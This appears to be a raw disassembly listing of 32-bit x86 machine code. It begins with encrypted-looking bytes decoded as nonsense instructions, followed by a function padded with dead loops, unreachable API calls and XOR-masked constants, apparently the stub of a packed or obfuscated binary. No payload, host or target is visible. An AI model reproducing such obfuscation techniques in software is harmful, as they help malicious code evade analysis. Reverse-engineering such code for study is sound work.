  414c45:	cmp    ecx,DWORD PTR [ecx+ebp*2]
  414c48:	or     al,0x68
  414c4a:	lahf   
  414c4b:	out    0xf1,al
  414c4d:	das    
  414c4e:	fwait
  414c4f:	pop    esp
  414c50:	jno    0x414bee
  414c52:	jmp    0x414ca2
  414c54:	std    
  414c55:	arpl   dx,bp
  414c57:	pop    edx
  414c58:	clc    
  414c59:	(bad)  
  414c5a:	xor    edi,ebx
  414c5c:	sti    
  414c5d:	imul   edi,DWORD PTR [esi-0x15d218d4],0x1d73d1bd
  414c67:	out    dx,eax
  414c68:	jge    0x414bec
  414c6a:	add    DWORD PTR [edi+0x26f1b691],eax
  414c70:	add    BYTE PTR [ebx+0x77],0xe5
  414c74:	push   esi
  414c75:	or     al,ah
  414c77:	imul   bl
  414c79:	sbb    BYTE PTR [esi+0x59],cl
  414c7c:	scas   al,BYTE PTR es:[edi]
  414c7d:	pop    esi
  414c7e:	or     eax,0x68df0a49
  414c83:	rcl    BYTE PTR [ebx-0x1f],cl
  414c86:	nop
  414c87:	les    esi,FWORD PTR [edx]
  414c89:	not    DWORD PTR [esi-0x38]
  414c8c:	jbe    0x414cff
  414c8e:	add    eax,0x70937e9c
  414c93:	push   edx
  414c94:	mov    dl,0x54
  414c96:	rcr    bh,1
  414c98:	jmp    0x1627:0xa68f3ce7
  414c9f:	mov    edx,0xaa70a11e
  414ca4:	pop    es
  414ca5:	jbe    0x414cc4
  414ca7:	adc    BYTE PTR [esi+0x759a173a],ch
  414cad:	test   BYTE PTR [esi+0x3d93eceb],bh
  414cb3:	mov    ebp,0x66e0edf1
  414cb8:	and    BYTE PTR es:[edi+0x6e],bh
  414cbc:	push   esp
  414cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cbe:	aaa    
  414cbf:	in     eax,dx
  414cc0:	ror    eax,1
  414cc2:	jp     0x414c87
  414cc4:	das    
  414cc5:	stc    
  414cc6:	es jmp 0x894a9eab
  414ccc:	(bad)  
  414cce:	adc    DWORD PTR [esi-0x673de2a4],edi
  414cd4:	test   al,0x8b
  414cd6:	xor    al,0x9c
  414cd8:	ss push eax
  414cda:	test   DWORD PTR [edx+edx*8+0x4c],edi
  414cde:	push   esi
  414cdf:	pop    ebx
  414ce0:	pop    es
  414ce1:	(bad)  
  414ce2:	cmc    
  414ce3:	cld    
  414ce4:	inc    eax
  414ce5:	jae    0x414ced
  414ce7:	rcl    ch,cl
  414ce9:	inc    eax
  414cea:	dec    esi
  414ceb:	outs   dx,DWORD PTR ds:[esi]
  414cec:	pushf  
  414ced:	jb     0x414ca6
  414cef:	or     BYTE PTR [edi-0x57cb471],cl
  414cf5:	xor    ch,BYTE PTR [ebp-0x46]
  414cf8:	mov    al,0xb
  414cfa:	push   cs
  414cfb:	das    
  414cfc:	pushf  
  414cfd:	mov    esp,0xbfeb44b5
  414d02:	sbb    ebx,ebp
  414d04:	lods   al,BYTE PTR ds:[esi]
  414d05:	jmp    0xfba9ff8e
  414d0a:	mov    ecx,0x9be5cff
  414d0f:	pop    esi
  414d10:	lds    esi,FWORD PTR [ebp-0x32]
  414d13:	mov    esi,0x373c2c6c
  414d18:	clc    
  414d19:	ficomp DWORD PTR [ebx+ebp*8-0x38]
  414d1d:	and    ebp,DWORD PTR [edx]
  414d1f:	outs   dx,BYTE PTR ds:[esi]
  414d20:	pusha  
  414d21:	jae    0x414d8c
  414d23:	mov    edx,0x8bea4501
  414d28:	mov    bh,0x1d
  414d2a:	xchg   ecx,eax
  414d2b:	stc    
  414d2c:	and    BYTE PTR [edi-0x11],cl
  414d2f:	fisubr DWORD PTR [ecx-0x270ffed1]
  414d35:	les    ebx,FWORD PTR [eax+0x3ec2f31f]
  414d3b:	dec    ecx
  414d3c:	push   esi
  414d3d:	cmc    
  414d3e:	ins    BYTE PTR es:[edi],dx
  414d3f:	rcr    DWORD PTR [ebx-0x633a172c],0xfa
  414d46:	and    eax,0x89c56d3d
  414d4b:	aas    
  414d4c:	cmp    DWORD PTR [eax+0x18d2de0f],edi
  414d52:	mov    es,WORD PTR [ecx+0x4553f0cb]
  414d58:	pushf  
  414d59:	std    
  414d5a:	adc    al,0x92
  414d5c:	inc    ebp
  414d5d:	add    BYTE PTR gs:[esi-0x2e],al
  414d61:	jmp    0x414d02
  414d63:	cmp    DWORD PTR [ebx],0xffffffe0
  414d66:	shl    BYTE PTR [eax-0x1bed6529],0xd6
  414d6d:	jbe    0x414d5f
  414d6f:	or     BYTE PTR [eax-0xdce2aba],dl
  414d75:	in     al,dx
  414d76:	imul   edi,DWORD PTR [edx],0xffffffe1
  414d79:	inc    edx
  414d7a:	(bad)  
  414d7b:	lock loope 0x414d9e
  414d7e:	or     eax,DWORD PTR [ebx]
  414d80:	mov    ebp,0x388aadfb
  414d85:	mov    al,0x48
  414d87:	dec    edi
  414d88:	xchg   edi,eax
  414d89:	aam    0x79
  414d8b:	dec    ebx
  414d8c:	aas    
  414d8d:	int3   
  414d8e:	cmps   WORD PTR es:[esi],WORD PTR es:[edi]
  414d91:	fistp  DWORD PTR [ebp+ecx*1-0x48]
  414d95:	xor    al,0x3d
  414d97:	in     eax,dx
  414d98:	dec    ebx
  414d99:	mov    bh,0x1b
  414d9b:	pop    edx
  414d9c:	ins    BYTE PTR es:[edi],dx
  414d9d:	in     eax,0x92
  414d9f:	mov    edx,0xdc98c3ec
  414da4:	push   edi
  414da5:	(bad)  
  414da6:	mov    edi,0x477216e9
  414dab:	cmp    eax,0x18976f0a
  414db0:	pop    ds
  414db1:	jp     0x414e13
  414db3:	dec    ebx
  414db4:	daa    
  414db5:	mov    esi,0x557c6f0b
  414dba:	rcr    al,1
  414dbc:	inc    ecx
  414dbd:	jnp    0x414db9
  414dbf:	push   edx
  414dc0:	push   di
  414dc2:	push   cs
  414dc3:	xchg   DWORD PTR [edx+esi*4],esp
  414dc6:	shr    DWORD PTR [ebx+0x11],cl
  414dc9:	cmp    dh,bh
  414dcb:	mov    cl,0xc6
  414dcd:	repz inc edi
  414dcf:	inc    esi
  414dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd1:	xchg   esi,eax
  414dd2:	les    edx,FWORD PTR [ecx+0x1]
  414dd5:	or     ah,ah
  414dd7:	sub    eax,0x17c73e8d
  414ddc:	jmp    0x58c:0xfff81cf2
  414de3:	mov    ch,0xe9
  414de5:	inc    edi
  414de6:	xchg   edi,eax
  414de7:	push   ebx
  414de8:	ins    BYTE PTR es:[edi],dx
  414de9:	pop    esp
  414dea:	add    edx,DWORD PTR [eax]
  414dec:	sbb    cl,BYTE PTR [ebx+esi*4]
  414def:	dec    edx
  414df0:	in     eax,dx
  414df1:	mov    al,ds:0x8a869c3b
  414df6:	sti    
  414df7:	pop    ds
  414df8:	sub    esp,DWORD PTR [eax]
  414dfa:	jne    0x414e3e
  414dfc:	inc    ebp
  414dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dfe:	rol    BYTE PTR [ebx+0x58],cl
  414e01:	jb     0x414dd0
  414e03:	mov    cl,0xc0
  414e05:	mov    dh,0x23
  414e07:	inc    ecx
  414e08:	sbb    ch,BYTE PTR [edi+0x642f62e]
  414e0e:	sbb    al,0x3c
  414e10:	push   edi
  414e11:	mov    cl,0xca
  414e13:	inc    ecx
  414e14:	shl    BYTE PTR ds:0x47a6205,0x2a
  414e1b:	shr    DWORD PTR [ebp+ebx*8+0x72],0xbf
  414e20:	into   
  414e21:	mov    ecx,0xfa4b88bd
  414e26:	mov    bh,dh
  414e28:	jbe    0x40fa94
  414e2e:	pop    ebx
  414e2f:	pop    edi
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
